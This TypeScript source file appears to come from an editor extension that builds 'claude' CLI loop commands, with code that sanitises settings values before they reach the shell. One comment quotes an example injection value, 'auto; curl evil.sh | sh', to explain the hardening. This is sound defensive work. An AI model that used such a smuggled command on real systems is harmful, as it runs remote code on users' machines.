// Pure loop-command builder. No vscode imports so it is unit-testable in Docker.
import { Model, isValidEffort, sanitizeGroomConcurrency } from './model';

// Allowlist for `--permission-mode`, mirroring the `loopBoard.permissionMode` enum in package.json.
// This value is spliced UNQUOTED into the loop terminal shell command (buildClaudeBase). package.json's
// enum only constrains the Settings UI — a repo-supplied `.vscode/settings.json` can set it to any
// string (e.g. `auto; curl evil.sh | sh`), which would execute when the user starts a loop. So the
// value MUST be validated before it reaches the shell line; an off-list value falls back to 'auto'.
export const PERMISSION_MODES = ['auto', 'acceptEdits', 'bypassPermissions', 'dontAsk', 'default', 'plan'];
export function isValidPermissionMode(s: string): boolean {
  return PERMISSION_MODES.indexOf(s) !== -1;
}
export function sanitizePermissionMode(s: string): string {
  return isValidPermissionMode(s) ? s : 'auto';
}

// The loop interval rides into the `/loop <interval> …` bootstrap prompt (buildLoopCommand). Restrict
// it to a plain <digits><unit> token so a settings-supplied value can't smuggle anything else onto the
// line. Units s/m/h/d match the /loop skill; an invalid value falls back to '1m'.
const LOOP_INTERVAL_RE = /^\d+[smhd]$/;
export function isValidLoopInterval(s: string): boolean {
  return LOOP_INTERVAL_RE.test(s);
}
export function sanitizeLoopInterval(s: string): string {
  return isValidLoopInterval(s) ? s : '1m';
}

// Build the `claude …` invocation prefix (everything before the /loop prompt argv). The resolved
// `--model` string is configurable and may contain shell glob metacharacters (`[` `]`, e.g.
// `haiku[1m]`), so it MUST be single-quoted — otherwise zsh tries to glob-expand it and aborts with
// "no matches found". The string is pre-validated (isValidModelString) to contain no single quote,
// so a plain single-quote wrap is safe. permissionMode is spliced unquoted, so it is sanitized to the
// package.json enum here (invalid -> 'auto') — never trust a raw config value on the shell line.
//
// `sessionName` (t-2b89) is `--name loopboard-<slot>`: the ONLY thing that tells one slot's Claude
// session from another's in `~/.claude/sessions/*.json` (every loop terminal spawns with the same
// cwd, and the session file records no ppid). It is derived from the fixed slot id, never from
// configuration, so it needs no quoting or escaping. Preferred over pinning `--session-id` because
// `/clear` starts a NEW session id in the same process — the name survives, the id does not.
//
// `effort` (t-cffc) is the slot's `loopBoard.models.<slot>.effort`, passed as `--effort <level>`
// on EVERY spawn — the loop session's reasoning effort; subagents it spawns run at the same level.
// Spliced unquoted, so it is validated against EFFORT_LEVELS here (invalid/absent -> 'medium'),
// the same hardening as permissionMode — a raw config value never reaches the shell line.
export function buildClaudeBase(permissionMode: string, modelString: string, sessionName?: string, effort?: string): string {
  const name = sessionName ? ` --name ${sessionName}` : '';
  const level = typeof effort === 'string' && isValidEffort(effort) ? effort : 'medium';
  return `claude --permission-mode ${sanitizePermissionMode(permissionMode)} --model '${modelString}' --effort ${level}${name}`;
}

// Build the tiny bootstrap prompt pasted into a loop terminal: it only names the model, the
// interval, the grooming cap and (t-e3c3) the delegated-work mode; the worker reads the full
// standing instructions from
// `.loopboard/LOOP.md`'s ## Automation section on every pass (so editing that section retunes
// running loops). Effort is NOT here (t-cffc): it is a `claude --effort` startup flag
// (buildClaudeBase). The grooming concurrency cap (t-23ce) rides the prompt because it is per-slot
// and the sync path copies template blocks byte-for-byte with no interpolation, so LOOP.md cannot
// carry a configured NUMBER — only the prompt can. LOOP.md carries the BEHAVIOUR, phrased against "the grooming cap
// named in your bootstrap prompt", so the two halves stay in step without duplicating the value.
//
// LOOP.md contains several fenced blocks (layout, workflow, grammars), so we must NOT grab the
// first fence: slice from the `## Automation` heading to the next `## ` heading (or EOF), and
// require a fenced block inside that slice. No block -> undefined (caller warns).
export function buildLoopCommand(
  loopText: string,
  model: Model,
  interval: string,
  groomConcurrency?: number,
  // t-e3c3: `loopBoard.delegateWork` / `loopBoard.delegateReview`. Only an activation PHRASE
  // rides here — the behaviour for each mode lives in LOOP.md's Automation block. A non-boolean
  // (absent/hostile config) is treated as the default: delegation off, review on.
  delegateWork: boolean = false,
  delegateReview: boolean = true
): string | undefined {
  const lines = loopText.split('\n');
  let start = -1;
  for (let i = 0; i < lines.length; i++) {
    if (/^##\s+Automation\b/i.test(lines[i])) {
      start = i;
      break;
    }
  }
  if (start < 0) return undefined;
  let end = lines.length;
  for (let i = start + 1; i < lines.length; i++) {
    if (/^##\s+/.test(lines[i])) {
      end = i;
      break;
    }
  }
  const section = lines.slice(start, end).join('\n');
  if (!/```[^\n]*\n[\s\S]*?```/.test(section)) return undefined;

  const groomCap = sanitizeGroomConcurrency(groomConcurrency);
  const delegate = delegateWork === true;
  const review = delegateReview !== false;
  // Apostrophe-free by construction (single-quoted argv); each mode's line must stay < 300 chars.
  const delegatePhrase = !delegate ? '' : review ? ' Delegate work to subagents.' : ' Delegate work to subagents without review.';
  return (
    `/loop ${sanitizeLoopInterval(interval)} You are running as model ${model} with a grooming concurrency cap of ${groomCap}. ` +
    `Open .loopboard/LOOP.md, read the loop worker instructions in its Automation section, and follow them exactly for this and every pass.` +
    delegatePhrase
  );
}
